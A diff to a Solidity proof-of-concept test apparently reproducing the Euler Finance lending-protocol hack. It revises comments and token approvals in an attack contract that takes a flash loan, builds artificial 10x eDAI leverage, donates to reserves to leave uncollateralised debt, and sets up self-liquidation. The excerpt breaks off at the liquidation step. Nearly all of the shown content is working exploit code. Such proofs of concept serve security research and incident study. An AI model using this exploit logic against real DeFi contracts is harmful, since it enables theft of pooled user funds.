@@ -31,7 +31,7 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {
          violator = new Violator();
      }
 
-    // 1. Flahsloan from AaveV2
+    // 1. Flahsloan from AaveV3
     function callFashLoan(address _tokenAddress, uint256 _amount) external {
        POOL.flashLoanSimple(address(this), _tokenAddress, _amount, "0x", 0);
     }
@@ -49,7 +49,7 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {
     {
 
         IERC20 token = IERC20(asset);
-        // 2. Transfer the full loan balance to the violator
+        // 2. Transfer the full loan balance to the violator contract
         token.transfer(address(violator), amount);
 
         // Start the attack using 2/3 of the funds
@@ -69,9 +69,8 @@ contract EulerHackPoC is FlashLoanSimpleReceiverBase, Test {
             });
         }
 
-        // Approve the LendingPool contract allowance to pull the owed amount
-        uint amountOwing = amount + premium;
-        token.approve(address(POOL), amountOwing);
+        // Approve the Pool contract allowance to pull the owed amount
+        token.approve(address(POOL), repayAmount);
 
         return true;
     }
@@ -87,15 +86,14 @@ contract Violator {
         liquidator = new Liquidator();
     }
 
-    function executeAttack( IERC20 _token, uint256 _amount) external {
-        _token.approve(EulerAddresses.EULER, type(uint256).max);
-
-        // Check balance
+    function executeAttack(IERC20 _token, uint256 _amount) external {
+        // Check DAI balance
         uint256 balance = _token.balanceOf(address(this));
 
-        // minBalance = 1.5 * _amount since amount is 2/3 of the flashloan
+        // minBalance is 150% of _amount since we are using 2/3 for leverage and 1/3 for repay and cause the dDAI balance to decrease
         uint256 minBalance = (_amount * 3) / 2;
 
+        // Check if we have enough funds to execute the attack
         if(balance < minBalance) {
             revert NotEnoughFunds({
                 balance: balance,
@@ -103,30 +101,33 @@ contract Violator {
             });
         }
 
+        // Approve Euler contract
+        _token.approve(EulerAddresses.EULER, minBalance);
 
         EToken eToken = EToken(EulerAddresses.eDAI);
 
-        // 3. Deposit _amount to the EToken of Euler Finance
+        //3. Deposit 2/3 to eDAI
         eToken.deposit(0, _amount);
 
-        // 4. Create a 10x artificial EToken leverage
+        // 4. Create a 10x artificial eDAI leverage
         uint256 amountLeveraged = _amount * 10;
         eToken.mint(0, amountLeveraged);
 
         DToken dToken = DToken(EulerAddresses.dDAI);
-        // 5. Repay _amount / 2 _token on the violator’s position, causing their DToken balance to decrease
+
+        // 5. Repay half of the DAI violator’s position, causing their dDAI balance to decrease
         dToken.repay(0, _amount / 2);
 
-        // 6. Create another 10x artificial EToken leverage
+        // 6. Create another 10x artificial eDAI leverage
         eToken.mint(0, amountLeveraged);
 
-        // 7. Donate half of EToken (leveraged) balance to the reserve of the EToken
+        // 7. Donate half of eDAI (leveraged) balance to the reserve of the eDAI
         eToken.donateToReserves(0, amountLeveraged / 2);
 
         uint256 eTokenBalance = eToken.balanceOfUnderlying(address(this));
         uint256 dTokenBalance = dToken.balanceOf(address(this));
 
-        // violator contains a significantly larger amount of DToken than EToken that will never be collateralized
+        // violator contains a significantly larger amount of dDAI than eDAI that will never be collateralized
         assert(dTokenBalance > eTokenBalance);
 
         // 8. Liquidate the violator’s position
